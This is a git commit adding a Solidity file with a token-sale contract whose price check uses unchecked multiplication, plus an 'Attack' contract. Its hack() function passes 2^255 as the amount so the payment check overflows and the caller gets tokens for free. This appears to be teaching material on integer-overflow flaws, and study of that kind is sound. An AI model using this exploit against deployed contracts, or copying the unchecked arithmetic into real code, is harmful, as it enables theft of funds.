0617dc74741c425aaa213454c59dba44bd743a0c
erengnn <49316630+erengnn@users.noreply.github.com>
2021-02-06 01:59:36 +0300

    Add files via upload

---
+++ BuyToken.sol
@@ -0,0 +1,42 @@
+pragma solidity ^0.4.10;
+contract BuyToken {
+    mapping(address => uint) public balances;
+    uint public price=1;
+    address public owner=msg.sender;
+
+    /** @dev Buy tokens.
+     *  @param _amount The amount to buy.
+     *  @param _price  The price to buy those in ETH.
+     */
+    function buyToken(uint _amount, uint _price) payable {
+        require(_price>=price); // The price is at least the current price.
+        require(_price * _amount * 1 ether <= msg.value); // You have paid at least the total price.
+        balances[msg.sender]+=_amount;
+    }
+
+    /** @dev Set the price, only the owner can do it.
+     *  @param _price The new price.
+     */
+    function setPrice(uint _price) {
+        require(msg.sender==owner);
+
+        price=_price;
+    }
+}
+
+contract Attack{
+    BuyToken buyToken;
+
+    function Attack(address _add){
+        buyToken = BuyToken(_add);
+    }
+
+    //Check the this contract address balance after the using this function.
+    function hack() payable{
+        uint amount = 0x8000000000000000000000000000000000000000000000000000000000000000;
+        buyToken.buyToken(amount,1);
+
+    }
+
+
+}
